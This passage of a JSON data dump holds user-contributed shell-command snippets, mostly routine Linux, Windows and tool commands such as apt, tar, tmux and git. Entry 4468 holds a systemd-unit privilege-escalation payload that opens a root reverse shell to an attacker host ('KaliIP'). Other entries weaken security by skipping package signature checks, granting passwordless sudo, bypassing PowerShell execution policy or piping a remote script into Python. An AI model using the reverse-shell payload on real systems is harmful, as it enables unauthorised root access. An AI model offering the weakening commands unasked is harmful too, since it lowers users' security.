  },
  {
    "id": 4456,
    "keyword": null,
    "link": null,
    "title": " sudo apt install openjdk-14-jdk",
    "description": "$ apt search openjdk \n",
    "reg_date": "2021-10-11T22:12:08.000Z"
  },
  {
    "id": 4457,
    "keyword": null,
    "link": null,
    "title": " sudo apt update",
    "description": "sudo apt-get update && sudo apt-get upgrade\n# \"To update Linux type:\" sudo apt-get update # Enter your user's password.\nsudo apt-get update -y && sudo apt-get upgrade -y  easy ;)\n",
    "reg_date": "2021-10-11T22:12:08.000Z"
  },
  {
    "id": 4458,
    "keyword": null,
    "link": null,
    "title": " sudo apt update ignore gpg signature",
    "description": "sudo apt-get --allow-unauthenticated upgrade\n",
    "reg_date": "2021-10-11T22:12:08.000Z"
  },
  {
    "id": 4459,
    "keyword": null,
    "link": null,
    "title": " sudo command without giving password",
    "description": "echo \"$USER ALL=(ALL) NOPASSWD:ALL\" | sudo tee -a /etc/sudoers \n# Run `visudo` to edit the file `/etc/sudoers`: sudo visudo  # For example, to allow the `shutdown` command to run without a password.  # Add this to the file, replacing `myusername` with your own login name for your PC: myusername ALL = NOPASSWD: /sbin/shutdown  # NOTE: `sudo` is still required to run the command so you still have to specify the command as: sudo shutdown\n",
    "reg_date": "2021-10-11T22:12:08.000Z"
  },
  {
    "id": 4460,
    "keyword": null,
    "link": null,
    "title": " sudo kill port windows",
    "description": "sudo kill -9 `sudo lsof -t -i:9001` \nStep 1:  netstat -ano | findstr :yourPortNumber   Change in Step 2 to:  tskill typeyourPIDhere   Note: taskkill is not working in some git bash terminal\nsudo kill -9 $(sudo lsof -t -i:8080) \nnetstat -aon | findstr 8080 taskkill /f /pid 77777 \nnetstat -ano | findstr :yourPortNumber  tskill typeyourPIDhere \n",
    "reg_date": "2021-10-11T22:12:09.000Z"
  },
  {
    "id": 4461,
    "keyword": null,
    "link": null,
    "title": " sudo nano /etc/hosts",
    "description": "sudo nano /etc/hosts\n",
    "reg_date": "2021-10-11T22:12:09.000Z"
  },
  {
    "id": 4462,
    "keyword": null,
    "link": null,
    "title": " sudo not found docker",
    "description": "# FROM ubuntu:12.04  # RUN  apt-get update  # And apt-get -y install sudo  #RUN  useradd -m docker && echo \"docker:docker\" | chpasswd && adduser docker sudo  USER docker CMD /bin/bash \n",
    "reg_date": "2021-10-11T22:12:09.000Z"
  },
  {
    "id": 4463,
    "keyword": null,
    "link": null,
    "title": " sudo ufw status Status: inactive",
    "description": "sudo ufw enable\n",
    "reg_date": "2021-10-11T22:12:09.000Z"
  },
  {
    "id": 4464,
    "keyword": null,
    "link": null,
    "title": " sudo ufw status returns inactive",
    "description": "sudo ufw enable\n",
    "reg_date": "2021-10-11T22:12:09.000Z"
  },
  {
    "id": 4465,
    "keyword": null,
    "link": null,
    "title": " sudo ufw status status inactive",
    "description": "sudo ufw enable\n",
    "reg_date": "2021-10-11T22:12:09.000Z"
  },
  {
    "id": 4466,
    "keyword": null,
    "link": null,
    "title": " sudo update",
    "description": "sudo apt-get update && sudo apt-get upgrade\n# \"To update Linux type:\" sudo apt-get update # Enter your user's password.\n",
    "reg_date": "2021-10-11T22:12:10.000Z"
  },
  {
    "id": 4467,
    "keyword": null,
    "link": null,
    "title": " sudoers nopasswd",
    "description": "# skipping ask password for users with sudo <USER_NAME>\tALL=(ALL:ALL) NOPASSWD: ALL\n# user user\tALL=(ALL:ALL) NOPASSWD: ALL  # group  %sudo\tALL=(ALL:ALL) NOPASSWD: ALL\n%sudo   ALL=(ALL:ALL) ALL \n",
    "reg_date": "2021-10-11T22:12:10.000Z"
  },
  {
    "id": 4468,
    "keyword": null,
    "link": null,
    "title": " suid privilege escalation systemctl",
    "description": "[Unit] Description=roooooooooot  [Service] Type=simple User=root ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/KaliIP/9999 0>&1'  [Install] WantedBy=multi-user.target \nfind -type f -maxdepth 2 -writable \n/bin/systemctl enable /var/tmp/root.service Created symlink from /etc/systemd/system/multi-user.target.wants/root.service to /var/tmp/root.service Created symlink from /etc/systemd/system/root.service to /var/tmp/root.service \n",
    "reg_date": "2021-10-11T22:12:10.000Z"
  },
  {
    "id": 4469,
    "keyword": null,
    "link": null,
    "title": " svn diff",
    "description": "svn diff [FILE_NAME]\n",
    "reg_date": "2021-10-11T22:12:10.000Z"
  },
  {
    "id": 4470,
    "keyword": null,
    "link": null,
    "title": " svn git equivalent commands",
    "description": "git clone \t\tCopy a repository \t\t\t\tsvn checkout git commit \t\tRecord changes to file history \tsvn commit git show \t\tView commit details \t\t\tsvn cat git status \t\tConfirm status \t\t\t\t\tsvn status git diff \t\tCheck differences \t\t\t\tsvn diff git log \t\tCheck log \t\t\t\t\t\tsvn log git add \t\tAddition \t\t\t\t\t\tsvn add git mv \t\t\tMove \t\t\t\t\t\t\tsvn mv git rm \t\t\tDelete \t\t\t\t\t\t\tsvn rm git checkout \tCancel change \t\t\t\t\tsvn revert git reset \t\tCancel change \t\t\t\t\tsvn revert git branch \t\tMake a branch \t\t\t\t\tsvn copy git checkout \tSwitch branch \t\t\t\t\tsvn switch git merge \t\tMerge \t\t\t\t\t\t\tsvn merge git tag \t\tCreate a tag \t\t\t\t\tsvn copy git pull \t\tUpdate \t\t\t\t\t\t\tsvn update git fetch \t\tUpdate \t\t\t\t\t\t\tsvn update git push \t\tIt is reflected on the remote \tsvn commit .gitignore \t\tIgnore file list \t\t\t\t.svnignore\n",
    "reg_date": "2021-10-11T22:12:10.000Z"
  },
  {
    "id": 4471,
    "keyword": null,
    "link": null,
    "title": " svn log last 10",
    "description": "svn log --limit 10 or svn log -l 10\n",
    "reg_date": "2021-10-11T22:12:10.000Z"
  },
  {
    "id": 4472,
    "keyword": null,
    "link": null,
    "title": " swappiness linux",
    "description": "sudo sysctl vm.swappiness=10\n",
    "reg_date": "2021-10-11T22:12:10.000Z"
  },
  {
    "id": 4473,
    "keyword": null,
    "link": null,
    "title": " swapping of two numbers without using third variable in shell script",
    "description": "#!/bin/bash echo \"enter first number\" read a echo \"enter second number\" read b echo \"a before swapping is $a and b is $b\" #swapping a=$((a+b)) b=$((a - b)) a=$((a-b)) echo \"a after swapping is  $a and b is $b\" \n",
    "reg_date": "2021-10-11T22:12:10.000Z"
  },
  {
    "id": 4474,
    "keyword": null,
    "link": null,
    "title": " sweep lan for ip addresses",
    "description": "arp -a\n",
    "reg_date": "2021-10-11T22:12:11.000Z"
  },
  {
    "id": 4475,
    "keyword": null,
    "link": null,
    "title": " switch user in windows 10",
    "description": "powershell -windowstyle hidden -command \"Start-Process cmd -ArgumentList '/s,/c,REG Delete HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /V HideFastUserSwitching /F & REG Delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /V HideFastUserSwitching /F & taskkill /f /im explorer.exe & start explorer.exe' -Verb runAs\" \n",
    "reg_date": "2021-10-11T22:12:11.000Z"
  },
  {
    "id": 4476,
    "keyword": null,
    "link": null,
    "title": " sync show progress",
    "description": "watch -d grep -e Dirty: -e Writeback: /proc/meminfo\n",
    "reg_date": "2021-10-11T22:12:11.000Z"
  },
  {
    "id": 4477,
    "keyword": null,
    "link": null,
    "title": " syntax highlighting zsh",
    "description": "In your ~/.zshrc Simply clone this repository and source the script:  git clone https://github.com/zsh-users/zsh-syntax-highlighting.git echo \"source ${(q-)PWD}/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh\" >> ${ZDOTDIR:-$HOME}/.zshrc  Then, enable syntax highlighting in the current interactive shell:  source ./zsh-syntax-highlighting/zsh-syntax-highlighting.zsh If git is not installed, download and extract a snapshot of the latest development tree from:  https://github.com/zsh-users/zsh-syntax-highlighting/archive/master.tar.gz Note the source command must be at the end of ~/.zshrc.\ngit clone https://github.com/zsh-users/zsh-syntax-highlighting.git ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-syntax-highlighting\n",
    "reg_date": "2021-10-11T22:12:11.000Z"
  },
  {
    "id": 4478,
    "keyword": null,
    "link": null,
    "title": " table markdown github",
    "description": "| First Header  | Second Header | | ------------- | ------------- | | Content Cell  | Content Cell  | | Content Cell  | Content Cell  |\n<!-- Where ever you want a table of contents item to be, which will present itself as a hyperlink that will navigate to the part of the  page you want it to, use the syntax below -->  - [Example Table of Contents Item](#Example-Table-of-Contents-Item)  # Shanah Capstone Project Description  - [OneWord](#OneWord)  # Shanah Capstone Project Description  <!-- What is in the square brackets is the text that will appear in the hyperlink, and in the curved bracket is what is used to navigate so you can keep the Text the same just separate the words with hyphens then use a markdown heading for the point you want to navigate to -->\n",
    "reg_date": "2021-10-11T22:12:12.000Z"
  },
  {
    "id": 4479,
    "keyword": null,
    "link": null,
    "title": " tail access log",
    "description": "sudo tail /var/log/apache2/error.log\nsudo tail -100 /etc/httpd/logs/access_log\n",
    "reg_date": "2021-10-11T22:12:12.000Z"
  },
  {
    "id": 4480,
    "keyword": null,
    "link": null,
    "title": " tail docker container logs",
    "description": "docker logs -f --tail 100 container-name\ndocker logs -f --tail 10 container_name \n",
    "reg_date": "2021-10-11T22:12:12.000Z"
  },
  {
    "id": 4481,
    "keyword": null,
    "link": null,
    "title": " tail grep",
    "description": "tail -f file | grep --line-buffered my_pattern\n",
    "reg_date": "2021-10-11T22:12:12.000Z"
  },
  {
    "id": 4482,
    "keyword": null,
    "link": null,
    "title": " tail log of spring boot service (linux)",
    "description": "#if you have your springboot app running on a linux server and you want  #to view the logs logs of your app journalctl -u servicename.service -f\n",
    "reg_date": "2021-10-11T22:12:12.000Z"
  },
  {
    "id": 4483,
    "keyword": null,
    "link": null,
    "title": " tailwind install in laravel",
    "description": "1. npm install; 2. npm install -D tailwindcss@latest postcss@latest autoprefixer@latest 3. resources/css/app.css ->    @import \"~tailwindcss/base.css\";   @import \"~tailwindcss/components.css\";\t   @import \"~tailwindcss/utilities.css\"; 4.webpack.mix.js -> in postCss[ \trequire(\"tailwindcss\"),     require(\"autoprefixer\"), ]  5.npx tailwindcss init 6.tailwind.config.js -> purge[ './vendor/laravel/framework/src/Illuminate/Pagination/resources/views/*.blade.php',         './storage/framework/views/*.php',         './resources/views/**/*.blade.php',         'they defers from projects to project ',         ]          7. add to the main rendered file    link --   <link rel=\"stylesheet\" href=\" {{ asset('css/app.css') }} \">   js -- <script src=\" {{asset(js/app.js)}} \"></script>\nnpm install -D tailwindcss@latest postcss@latest autoprefixer@latest\n/* ./resources/css/app.css */ @tailwind base; @tailwind components; @tailwind utilities;\n",
    "reg_date": "2021-10-11T22:12:12.000Z"
  },
  {
    "id": 4484,
    "keyword": null,
    "link": null,
    "title": " take ownership directory linux",
    "description": "sudo chown -R $USER ~/.blabla\nchown -R username:group directory\nsudo chown -R $USER ~/.blabla \n# Using the '*' wildcard you can include all other files and dirs # Only us as many wildcards as you have layers in you directory sudo chown <username:username> <directory_name>/*/*\n",
    "reg_date": "2021-10-11T22:12:12.000Z"
  },
  {
    "id": 4485,
    "keyword": null,
    "link": null,
    "title": " tar.gz",
    "description": "tar -czf tarball.tar.gz my_directory/\ntar -xvf file.tar.gz\ntar -xzf file.tar.gz\ntar -xzvf archive.tar.gz\ntar -czvf projects.tar.gz projects/\ntar -xvzf community_images.tar.gz \n",
    "reg_date": "2021-10-11T22:12:12.000Z"
  },
  {
    "id": 4486,
    "keyword": null,
    "link": null,
    "title": " tar.gz terminal",
    "description": "tar -xzvf archive.tar.gz\ntar -czvf archive.tar.gz /usr/local/something\n",
    "reg_date": "2021-10-11T22:12:13.000Z"
  },
  {
    "id": 4487,
    "keyword": null,
    "link": null,
    "title": " tar a directory linux",
    "description": "# gzip my-folder-name # # flags: # \tz = filter the archive through gzip # \tc = create a new archive # \tv = verbosely list files processed # \tf = use archive file or device ARCHIVE # # Example: tar -zcvf my-filename.tar.gz my-folder-name\ntar -czvf name-of-archive.tar.gz /path/to/directory-or-file\ntar a directory linux\n",
    "reg_date": "2021-10-11T22:12:13.000Z"
  },
  {
    "id": 4488,
    "keyword": null,
    "link": null,
    "title": " tar directory",
    "description": "# gzip my-folder-name # # flags: # \tz = filter the archive through gzip # \tc = create a new archive # \tv = verbosely list files processed # \tf = use archive file or device ARCHIVE # # Example: tar -zcvf my-filename.tar.gz my-folder-name\ntar -czvf name-of-archive.tar.gz /path/to/directory-or-file\ntar -czvf archive.tar.gz stuff\ntar cf ostechnix.tar ostechnix/ # Here, c flag refers create new archive and f refers the file name.\ntar a directory linux\n",
    "reg_date": "2021-10-11T22:12:13.000Z"
  },
  {
    "id": 4489,
    "keyword": null,
    "link": null,
    "title": " tar exclude directory",
    "description": "$ tar --exclude='./folder' --exclude='./upload/folder2' -zcvf /backup/filename.tgz .\ntar -cvf backup.tar --exclude=\"log\" --exclude=\"cache\" public_heml/\n# create a gzip archive of my-backup-folder # but exclude all node_module directories # flags: #\t--exclude = exclude files, given as a PATTERN # \t-c = create a new archive # \t-z = filter the archive through gzip # \t-f = use archive file or device ARCHIVE # # IMPORTANT NOTE: # the exclude flag needs to come first to work tar --exclude \"node_modules\" -czf backup.tar.gz /my-backup-folder \ntar -cvf backup.tar --exclude=\"public_html/template/cache\" public_html/\ntar -cvf backup.tar -X exclude_directory.txt public_html/\n",
    "reg_date": "2021-10-11T22:12:13.000Z"
  },
  {
    "id": 4490,
    "keyword": null,
    "link": null,
    "title": " tar extract",
    "description": "tar -xvf filename.tar\ntar -xzf packed.tar.gz\ntar -zxvf file_name.tar.gz\ntar -xzvf archive.tar.gz\ntar -xvf file.tar\ntar -xf archive.tar.bz2 -C /home/linuxize/filesCopy\n",
    "reg_date": "2021-10-11T22:12:13.000Z"
  },
  {
    "id": 4491,
    "keyword": null,
    "link": null,
    "title": " tar file",
    "description": "tar -czvf name-of-archive.tar.gz /path/to/directory-or-file\ntar -czvf archive.tar.gz /usr/local/something \ntar -zcvf test.tar.gz /path/to/test/folder\ntar -xf /path/to/archive.tar # unzip .tar\n",
    "reg_date": "2021-10-11T22:12:13.000Z"
  },
  {
    "id": 4492,
    "keyword": null,
    "link": null,
    "title": " tar files command lne",
    "description": "tar -czvf archive.tar.gz stuff\n",
    "reg_date": "2021-10-11T22:12:13.000Z"
  },
  {
    "id": 4493,
    "keyword": null,
    "link": null,
    "title": " tar gz linux command",
    "description": "tar -czf tarball.tar.gz my_directory/\ntar -xzvf archive.tar.gz\ntar -zcvf file.tar.gz /path/to/dir/\ntar -czvf projects.tar.gz projects/\ntar -xvzf community_images.tar.gz \n",
    "reg_date": "2021-10-11T22:12:13.000Z"
  },
  {
    "id": 4494,
    "keyword": null,
    "link": null,
    "title": " tar unpack",
    "description": "tar -xzf packed.tar.gz\ntar -xvf file.tar etc/resolv.conf tar -xzvf file.tar.gz etc/resolv.conf tar -xjvf file.tar.bz2 etc/resolv.conf  #Extract files into a specific folder tar -xf archive.tar.gz -C /home/linuxize/files \n",
    "reg_date": "2021-10-11T22:12:13.000Z"
  },
  {
    "id": 4495,
    "keyword": null,
    "link": null,
    "title": " taskkill in cmd",
    "description": "taskkill /f /im notepad.exe /t taskkill /f /im chrome.exe /t\ntaskkill /f /im Process_name.exe\n@echo off  :: ganti browser.exe dengan nama target yang mau di kill :: buka taskmanager pilih -> details -> kemudian ambil namanya :: jika ingin multiple taskkill process tambahkan hal yang sama seperti fungsi sebelumnya dibawahnya  taskkill /FI \"PID gt 1000\" /FI \"IMAGENAME eq browser.exe\" /F /T cls taskkill /FI \"PID gt 1000\" /FI \"IMAGENAME eq code.exe\" /F /T cls taskkill /FI \"PID gt 1000\" /FI \"IMAGENAME eq spotify.exe\" /F /T cls taskkill /FI \"PID gt 1000\" /FI \"IMAGENAME eq chrome.exe\" /F /T cls  exit\n",
    "reg_date": "2021-10-11T22:12:14.000Z"
  },
  {
    "id": 4496,
    "keyword": null,
    "link": null,
    "title": " tays vimrc",
    "description": "git clone https://github.com/TaylorHawkes/tays_vimrc.git ~/.vim && ln -s ~/.vim/.vimrc ~/.vimrc\n",
    "reg_date": "2021-10-11T22:12:14.000Z"
  },
  {
    "id": 4497,
    "keyword": null,
    "link": null,
    "title": " teclado abnt arch linux",
    "description": "# On terminal: sudo setxkbmap -model abnt2 -layout br -variant abnt2 \n",
    "reg_date": "2021-10-11T22:12:14.000Z"
  },
  {
    "id": 4498,
    "keyword": null,
    "link": null,
    "title": " telegram kali linux",
    "description": "Faster Telegram installation on Kali Linux https://youtu.be/VLmkotjJRmc\n",
    "reg_date": "2021-10-11T22:12:14.000Z"
  },
  {
    "id": 4499,
    "keyword": null,
    "link": null,
    "title": " telnet install on mac",
    "description": "brew install telnet\n",
    "reg_date": "2021-10-11T22:12:14.000Z"
  },
  {
    "id": 4500,
    "keyword": null,
    "link": null,
    "title": " telnet windows 10",
    "description": "dism /online /enable-feature /featurename:telnetclient\n",
    "reg_date": "2021-10-11T22:12:15.000Z"
  },
  {
    "id": 4501,
    "keyword": null,
    "link": null,
    "title": " terminal command uninstall android studio",
    "description": "rm -Rf /Applications/Android\\ Studio.app   rm -Rf ~/Library/Preferences/AndroidStudio*   rm -Rf ~/Library/Preferences/com.google.android.*   rm -Rf ~/Library/Preferences/com.android.*   rm -Rf ~/Library/Application\\ Support/AndroidStudio*   rm -Rf ~/Library/Logs/AndroidStudio*   rm -Rf ~/Library/Caches/AndroidStudio*   rm -Rf ~/.AndroidStudio*   rm -Rf ~/.gradle   rm -Rf ~/.android   rm -Rf ~/Library/Android*   rm -Rf /usr/local/var/lib/android-sdk/   \n",
    "reg_date": "2021-10-11T22:12:15.000Z"
  },
  {
    "id": 4502,
    "keyword": null,
    "link": null,
    "title": " terminal delete directory not empty",
    "description": "rm -rf myDirectory\nrm -rf dir-name\n",
    "reg_date": "2021-10-11T22:12:15.000Z"
  },
  {
    "id": 4503,
    "keyword": null,
    "link": null,
    "title": " terminal find file by extension recursive",
    "description": "find /directory/path -type f -name \"*.in\"\n",
    "reg_date": "2021-10-11T22:12:15.000Z"
  },
  {
    "id": 4504,
    "keyword": null,
    "link": null,
    "title": " terminal get folder size windows",
    "description": "# On PowerShell: cd \"your folder path\" ls -r | measure -sum Length\ndu -sh /directory/path\n",
    "reg_date": "2021-10-11T22:12:15.000Z"
  },
  {
    "id": 4505,
    "keyword": null,
    "link": null,
    "title": " terminal how to find a directory",
    "description": "find . -type d | grep DIRNAME\n",
    "reg_date": "2021-10-11T22:12:15.000Z"
  },
  {
    "id": 4506,
    "keyword": null,
    "link": null,
    "title": " terminal how to find a file name",
    "description": "find / -name NAME.EXTENSION\n",
    "reg_date": "2021-10-11T22:12:15.000Z"
  },
  {
    "id": 4507,
    "keyword": null,
    "link": null,
    "title": " terminal list folders with size",
    "description": "$ du -sh */ 788K    foo/ 500K    bar/ 931K    baz/ \n",
    "reg_date": "2021-10-11T22:12:15.000Z"
  },
  {
    "id": 4508,
    "keyword": null,
    "link": null,
    "title": " terminal list with folder dimension",
    "description": "$ du -sh */ 788K    foo/ 500K    bar/ 931K    baz/ \n",
    "reg_date": "2021-10-11T22:12:16.000Z"
  },
  {
    "id": 4509,
    "keyword": null,
    "link": null,
    "title": " terminal network speedtest",
    "description": "curl -s https://raw.githubusercontent.com/sivel/speedtest-cli/master/speedtest.py | python - \n",
    "reg_date": "2021-10-11T22:12:16.000Z"
  },
  {
    "id": 4510,
    "keyword": null,
    "link": null,
    "title": " terminal unzip",
    "description": "// install sudo apt install zip unzip  // zip zip -r example.zip original_folder  // unzip unzip file.zip -d destination_folder\nsudo apt-get install unzip unzip file.zip\nunzip file.zip -d destination_folder \n# basic command unzip filename.zip  # Use the following options to modify how the base unzip command works:  -d /path/to/extact/location: Unzip an archive to a different directory. -j: Unzip without creating new folders, if the zipped archive contains a folder structure. -l: Lists the contents of an archive file without extracting it. -n: Do not overwrite existing files; supply an alternative filename instead. -o: Overwrite files, if relevant. -P password: Supplies a password to unzip a protected archive file. -q: Unzips without writing status messages to the standard output. -t: Tests whether an archive file is valid. -v: Displays detailed (verbose) information about the archive without extracting it. -x filename: Extract the archive but do not extract the specified files.\nunzip zipped_file.zip -d unzipped_directory\nunzip zipname.zip\n",
    "reg_date": "2021-10-11T22:12:16.000Z"
  },
  {
    "id": 4511,
    "keyword": null,
    "link": null,
    "title": " terminal zip",
    "description": "# to compress tar -zcvf archive_name.tar.gz folder_to_compress # to extract tar -zxvf archive_name.tar.gz  # the \"v\" flag is for verbose and is not required\n",
    "reg_date": "2021-10-11T22:12:16.000Z"
  },
  {
    "id": 4512,
    "keyword": null,
    "link": null,
    "title": " terminator pour linux",
    "description": "sudo add-apt-repository ppa:gnome-terminator  sudo apt-get update  sudo apt-get install terminator \n",
    "reg_date": "2021-10-11T22:12:16.000Z"
  },
  {
    "id": 4513,
    "keyword": null,
    "link": null,
    "title": " terraform state",
    "description": "#Commands for Terraform State SYNTAX :     terraform state <subcommand> [options] [args]  #List Resources involed in terraform state file terraform state list #List Resources with given resource Block name terraform state list <resource name> #Shows the attributes of a single resource in the state file terraform state show 'resource name' #Pull the state files terraform state pull #Push the local state files to remote terraform state push #Remove Items from Terraform state terraform state rm 'packet_device.worker' #Moving the state from one source to another terraform state mv 'module.app' 'module.parent.module.app' #Rename a resource in the terraform state file without destroying terraform state mv 'packet_device.worker' 'packet_device.helper'\n",
    "reg_date": "2021-10-11T22:12:16.000Z"
  },
  {
    "id": 4514,
    "keyword": null,
    "link": null,
    "title": " test apache config",
    "description": "#check the syntax on your apache config(s) BEFORE you restart  sudo apachectl -t   #if that doesn't work on your server give this a go sudo apache2ctl configtest\napachectl configtest \n",
    "reg_date": "2021-10-11T22:12:16.000Z"
  },
  {
    "id": 4515,
    "keyword": null,
    "link": null,
    "title": " test internet speed command line",
    "description": "sudo apt install speedtest-cli\n$ speedtest Retrieving speedtest.net configuration... Testing from CenturyLink (65.128.194.58)... Retrieving speedtest.net server list... Selecting best server based on ping... Hosted by CenturyLink (Cambridge, UK) [20.49 km]: 31.566 ms Testing download speed................................................................................ Download: 68.62 Mbit/s Testing upload speed...................................................................................................... Upload: 10.93 Mbit/s\nnpm install --global fast-cli\n$ fast -u     ⠧ 80 Mbps &darr; / 8.2 Mbps &uarr;\n$ fast       82 Mbps &darr;\n",
    "reg_date": "2021-10-11T22:12:16.000Z"
  },
  {
    "id": 4516,
    "keyword": null,
    "link": null,
    "title": " test internet speed terminal linux",
    "description": "#Install it sudo apt install speedtest-cli #To run net speed  speedtest-cli #result as follows: Testing download speed................................................................................ Download: 9.54 Mbit/s Testing upload speed...................................................................................................... Upload: 14.61 Mbit/s\nsudo apt install speedtest-cli\n",
    "reg_date": "2021-10-11T22:12:16.000Z"
  },
  {
    "id": 4517,
    "keyword": null,
    "link": null,
    "title": " test smb connection linux",
    "description": "#ip replace it with yours sudo nmap --script smb-protocols ip \n",
    "reg_date": "2021-10-11T22:12:17.000Z"
  },
  {
    "id": 4518,
    "keyword": null,
    "link": null,
    "title": " the current numpy installation fails to pass sanity check",
    "description": "pip install numpy==1.19.3 \n",
    "reg_date": "2021-10-11T22:12:17.000Z"
  },
  {
    "id": 4519,
    "keyword": null,
    "link": null,
    "title": " the entity framework tools version",
    "description": "dotnet tool update --global dotnet-ef \n",
    "reg_date": "2021-10-11T22:12:17.000Z"
  },
  {
    "id": 4520,
    "keyword": null,
    "link": null,
    "title": " the file is not digitally signed powershell",
    "description": "Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass\n",
    "reg_date": "2021-10-11T22:12:17.000Z"
  },
  {
    "id": 4521,
    "keyword": null,
    "link": null,
    "title": " the input device is not a TTY. If you are using mintty, try prefixing the command with 'winpty'",
    "description": "winpty docker run -it ubuntu\n",
    "reg_date": "2021-10-11T22:12:17.000Z"
  },
  {
    "id": 4522,
    "keyword": null,
    "link": null,
    "title": " the remote end hung up unexpectedly",
    "description": "git remote remove origin git remote add origin  https://gitlab.com/your-page/your-page.git\ngit config --global http.postBuffer 100000000\n//fatal: the remote end hung up unexpectedly //Run this command git config http.postBuffer 524288000 \ngit config http.postBuffer 524288000\n",
    "reg_date": "2021-10-11T22:12:17.000Z"
  },
  {
    "id": 4523,
    "keyword": null,
    "link": null,
    "title": " thunk redux",
    "description": "npm install --save redux-thunk\nimport { createStore, applyMiddleware } from 'redux'; import thunk from 'redux-thunk'; import rootReducer from './reducers/index';  // Note: this API requires redux@>=3.1.0 const store = createStore(rootReducer, applyMiddleware(thunk));\nimport { createStore, applyMiddleware } from 'redux'; import thunk from 'redux-thunk';  const store = createStore(     rootReducer,     applyMiddleware(thunk) );  /*** remember to install redux-thunk: */ npm i redux-thunk --save-dev\n",
    "reg_date": "2021-10-11T22:12:17.000Z"
  },
  {
    "id": 4524,
    "keyword": null,
    "link": null,
    "title": " tic toc command bash",
    "description": "tic\t#start time counting toc #display time elapsed since last tic\n",
    "reg_date": "2021-10-11T22:12:18.000Z"
  },
  {
    "id": 4525,
    "keyword": null,
    "link": null,
    "title": " tic toc commands",
    "description": "tic\t#start time counting toc #display time elapsed since last tic\n",
    "reg_date": "2021-10-11T22:12:18.000Z"
  },
  {
    "id": 4526,
    "keyword": null,
    "link": null,
    "title": " time machine speed up",
    "description": "# To speed up Time Machine backups on your mac sudo sysctl debug.lowpri_throttle_enabled=0\n",
    "reg_date": "2021-10-11T22:12:18.000Z"
  },
  {
    "id": 4527,
    "keyword": null,
    "link": null,
    "title": " timezone brasil postgresql",
    "description": "## Edit file /var/lib/postgresql/data/postgresql.conf  # Update timezone='America/Sao_Paulo'  ## If you're in docker container run: apt update apt install nano  # Run to edit file nano /var/lib/postgresql/data/postgresql.conf\n",
    "reg_date": "2021-10-11T22:12:18.000Z"
  },
  {
    "id": 4528,
    "keyword": null,
    "link": null,
    "title": " tmu rename tab",
    "description": "C-b :rename-window <new name>\n",
    "reg_date": "2021-10-11T22:12:18.000Z"
  },
  {
    "id": 4529,
    "keyword": null,
    "link": null,
    "title": " tmux for ubuntu",
    "description": "sudo apt-get update sudo apt-get install tmux \n",
    "reg_date": "2021-10-11T22:12:18.000Z"
  },
  {
    "id": 4530,
    "keyword": null,
    "link": null,
    "title": " tmux how to kill all sessions",
    "description": "pkill -f tmux\n",
    "reg_date": "2021-10-11T22:12:18.000Z"
  },
  {
    "id": 4531,
    "keyword": null,
    "link": null,
    "title": " too many authentication failures ec2",
    "description": "ssh-add -l ssh-add -D  \n",
    "reg_date": "2021-10-11T22:12:18.000Z"
  },
  {
    "id": 4532,
    "keyword": null,
    "link": null,
    "title": " tor browser shortcut linux",
    "description": "-- move in tor directory and execute this command -- ./start-tor-browser.desktop --register-app\n",
    "reg_date": "2021-10-11T22:12:18.000Z"
  },
  {
    "id": 4533,
    "keyword": null,
    "link": null,
    "title": " torrent microsoft project 64 bit",
    "description": "sudo apt install qbittorrent\n",
    "reg_date": "2021-10-11T22:12:19.000Z"
  },
  {
    "id": 4534,
    "keyword": null,
    "link": null,
    "title": " traceroute linux",
    "description": "sudo apt-get install traceroute\nWindows \t\t- $tracert ip or domain Linux and MAC \t- $traceroute ip or domain\nsudo pacman -Sy traceroute\n",
    "reg_date": "2021-10-11T22:12:19.000Z"
  },
  {
    "id": 4535,
    "keyword": null,
    "link": null,
    "title": " traceroute ubuntu command",
    "description": "sudo apt-get install traceroute\nIn ubantu there is no option for tracert, this is command prompt command. In Ubantu you can use, Traceroute.  Installation: sudo apt install traceroute\n",
    "reg_date": "2021-10-11T22:12:19.000Z"
  },
  {
    "id": 4536,
    "keyword": null,
    "link": null,
    "title": " tree command for mac",
    "description": "brew install tree\n~/$ brew install tree==> Downloading http://mama.indstate.edu/users/ice/tree/src/tree-1.7.0.tgz######################################################################## 100.0%==> make prefix=/usr/local/Cellar/tree/1.7.0 MANDIR=/usr/local/Cellar/tree/1.7.0/share/man/man1 CC=clang CFLAGS=-fomit-frame-pointer LDFLAGS= OBJS=tree.o unix.o html.o xml.o hash.o?  /usr/local/Cellar/tree/1.7.0: 7 files, 128K, built in 4 seconds~/$\n",
    "reg_date": "2021-10-11T22:12:19.000Z"
  },
  {
    "id": 4537,
    "keyword": null,
    "link": null,
    "title": " tried accessing the FileTransfer plugin but it's not installed.",
    "description": "ionic cordova plugin add cordova-plugin-file-transfer\n",
    "reg_date": "2021-10-11T22:12:19.000Z"
  },
  {
    "id": 4538,
    "keyword": null,
    "link": null,
    "title": " trocar user name e emailgit",
    "description": "git config --global user.name \"Bob\"   git config --global user.email \"bob@example.com\" \n",
    "reg_date": "2021-10-11T22:12:19.000Z"
  },
  {
    "id": 4539,
    "keyword": null,
    "link": null,
    "title": " trojitá",
    "description": "# Ubuntu sudo -s sudo sh -c \"echo 'deb https://download.opensuse.org/repositories/home:/jkt-gentoo:/trojita/xUbuntu_16.04/ /' > /etc/apt/sources.list.d/trojita.list\" wget https://download.opensuse.org/repositories/home:jkt-gentoo:trojita/xUbuntu_16.04/Release.key sudo apt-key add - < Release.key sudo apt update sudo apt upgrade -y sudo apt install trojita  # Debian wget https://ftp.us.debian.org/debian/pool/main/m/mimetic/libmimetic0_0.9.8-1_amd64.deb cd ~/Downloads sudo dpkg -i libmimetic0_0.9.8-1_amd64.deb wget https://provo-mirror.opensuse.org/repositories/home:/jkt-gentoo:/trojita/Debian_8.0/amd64/trojita_0.7_amd64.deb sudo dpkg -i trojita_0.7_amd64.deb sudo apt-get install -f  # Arch Linux sudo nano /etc/pacman.conf sudo pacman -Syyu sudo pacman -S trojita sudo pacman -R trojita  # Fedora sudo dnf install trojita sudo dnf remove trojita \n",
    "reg_date": "2021-10-11T22:12:19.000Z"
  },
  {
    "id": 4540,
    "keyword": null,
    "link": null,
    "title": " trojitá ubuntu",
